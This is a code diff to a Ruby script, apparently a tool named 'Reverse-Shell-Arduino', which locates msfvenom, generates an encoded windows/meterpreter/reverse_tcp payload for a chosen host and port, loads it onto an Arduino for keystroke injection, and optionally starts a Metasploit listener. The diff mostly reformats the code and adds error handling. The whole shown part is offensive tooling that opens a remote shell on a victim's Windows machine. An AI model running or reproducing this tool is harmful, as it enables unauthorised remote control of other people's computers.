@@ -163,25 +163,37 @@ system("#{msf_path}./msfconsole -r #{rc_file}")
 end
 
 begin
-if File.exist?("#{ENV['PREFIX']}/bin/msfvenom")
-msf_path = "#{ENV['PREFIX']}/bin/"
-elsif File.exist?('/data/data/com.termux/files/usr/bin/msfvenom')
-msf_path = '/data/data/com.termux/files/usr/bin/'
-elsif File.exist?('/usr/bin/msfvenom')
-msf_path = '/usr/bin/'
-elsif File.exist?('/opt/metasploit-framework/msfvenom')
-msf_path = '/opt/metasploit-framework/'
-else
-puts '[!] Metasploit Not Found!'
-exit
-end
-@set_payload = 'windows/meterpreter/reverse_tcp'
-host = select_host
-port = select_port
-encoded_command = shellcode_gen(msf_path, host, port)
-shell_setup(encoded_command)
-arduino_setup(host)
-msf_setup = rgets('Would you like to start the listener?[yes/no] ')
-metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
-print_info("Thanks For Using Rᴇᴠᴇʀsᴇ-Sʜᴇʟʟ-Aʀᴅᴜɪɴᴏ Made By @Sirage7474\n")
+
+  if File.exist?("#{ENV['PREFIX']}/bin/msfvenom")
+    msf_path = "#{ENV['PREFIX']}/bin/"
+  elsif File.exist?('/data/data/com.termux/files/usr/bin/msfvenom')
+    msf_path = '/data/data/com.termux/files/usr/bin/'
+  elsif File.exist?('/usr/bin/msfvenom')
+    msf_path = '/usr/bin/'
+  elsif File.exist?('/opt/metasploit-framework/msfvenom')
+    msf_path = '/opt/metasploit-framework/'
+  else
+    puts '[!] Metasploit Not Found!'
+    exit
+  end
+
+  @set_payload = 'windows/meterpreter/reverse_tcp'
+
+  host = select_host
+  port = select_port
+
+  encoded_command = shellcode_gen(msf_path, host, port)
+  shell_setup(encoded_command)
+  arduino_setup(host)
+
+  print '[?] Would you like to start the listener? [yes/no]: '
+  msf_setup = gets.chomp.downcase
+
+  metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
+
+  puts "\n[*] Thanks For Using Rᴇᴠᴇʀsᴇ-Sʜᴇʟʟ-Aʀᴅᴜɪɴᴏ Made By @Sirage7474"
+
+rescue => e
+  puts "[!] Error: #{e.message}"
+  exit
 end
